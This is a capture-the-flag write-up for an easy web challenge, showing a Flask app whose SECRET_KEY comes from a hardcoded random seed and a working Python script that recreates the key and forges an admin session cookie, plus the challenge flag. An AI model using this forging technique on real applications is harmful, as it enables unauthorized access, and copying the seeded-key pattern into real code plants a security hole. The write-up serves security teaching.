# ## Hammering out

**Author:** randN
**Category:** web
**Difficulty:** easy

## Description
![](https://c.tenor.com/WE8xWqgnaIMAAAAC/cookie-cookie-monster.gif)

## Solve

In this challenge was provided the flask app source code. Accessing the URL provided:

![Alt text](https://github.com/uac-ctf/UA-CSW-CTF2022-Writeups/blob/master/web/hammer_out/images/home_page.png?raw=true)

the web app also provides us with a session cookie.

![Alt text](https://github.com/uac-ctf/UA-CSW-CTF2022-Writeups/blob/master/web/hammer_out/images/session_cookie.png?raw=true)

Looking at the source code, we can seed that there is an */admin* endpoint that will give us the flag if the *username* session attribute is defined as *admin*. The default value of this attribute will be *guest* if we access the index page.

```python
@app.route('/', methods=['GET', 'POST'])
def home():
    session['username'] = 'guest'
    return render_template('home.html')


@app.route('/admin', methods=['GET'])
def admin():
    if 'username' in session and session['username'] == 'admin':
        return 'CTFUA{REDACTED}'
    else:
        return 'Access denied!'
```

If we look at the documentation, <https://flask.palletsprojects.com/en/2.1.x/api/?highlight=session#sessions>, "The user can look at the session contents, but can’t modify it unless they know the secret key, so make sure to set that to something complex and unguessable." In this case, the application uses the built-in [random](https://docs.python.org/3/library/random.html) package to generate the **SECRET_KEY**.

```python
import os, random, string
random.seed('0xdeadbeef')

app = Flask(__name__)
app.config['SECRET_KEY'] = ''.join(random.choice(string.ascii_letters) for i in range(20))
```

But the random is using a hardcoded seed, and this will influence the way the key will be generated, because the seed will ["Initialize the random number generator"](https://docs.python.org/3/library/random.html#random.seed), meaning that all values generated will be the same if we "restart" the random generator. We just need to initialize a random generator with the same characteristics, and we will have the **SECRET_KEY**.

We can forge our session cookie, and there is already a tool for that, https://pypi.org/project/flask-unsign/.

A possible solution:

```python
import requests
import random
import string
import subprocess

# Create SECRET KEY used by the Flask app
random.seed('0xdeadbeef')
SECRET_KEY = ''.join(random.choice(string.ascii_letters) for i in range(20))

# Forge a session cookie (flask-unsign needs to be installed)
cmd_out = subprocess.check_output(['flask-unsign', '--sign', '--cookie', '{\'username\': \'admin\'}', '--secret', SECRET_KEY])

# Request the admin endpoint with the forged cookie
cookie = {'session' : cmd_out.decode().rstrip()}
response = requests.get('http://cybersecweek.ua.pt:2007/admin', cookies=cookie)

print(response.text)
```

This will give us the flag.

```python
CTFUA{f0rGing_fl4Sk_c00ki3s_WIth_ins3cur3_rand0ms}
```
